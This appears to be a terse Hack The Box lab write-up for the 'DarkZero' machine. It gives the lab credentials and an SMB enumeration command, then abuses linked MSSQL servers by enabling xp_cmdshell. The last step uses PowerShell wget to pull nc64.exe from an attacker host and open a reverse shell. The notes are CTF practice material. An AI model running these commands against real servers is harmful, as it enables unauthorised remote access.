---
title: "DarkZero"
date: 2025-11-03T14:38:03+02:00
draft: false
---

* htb provided cred: john.w / RFulUtONCOL!

1. nmap scan

2. smb share enumeration
- smbmap -H 10.10.11.89 -d 'darkzero.htb' -u 'john.w' -p 'RFulUtONCOL!'

3. dns query analysis
- dig @10.10.11.89 darkzero.htb ANY

;; ADDITIONAL SECTION:
dc01.darkzero.htb.	3600	IN	A	10.10.11.89
dc01.darkzero.htb.	3600	IN	A	172.16.20.1

4. mssql rev shel via impacket
- enum_links
- use_link "DC02.darkzero.htb"
- enable_xp_cmdshell

5. upload nc64.exe to target
- xp_cmdshell powershell wget -UseBasicParsing http://10.10.14.223/nc64.exe -OutFile nc64.exe

6. test commit
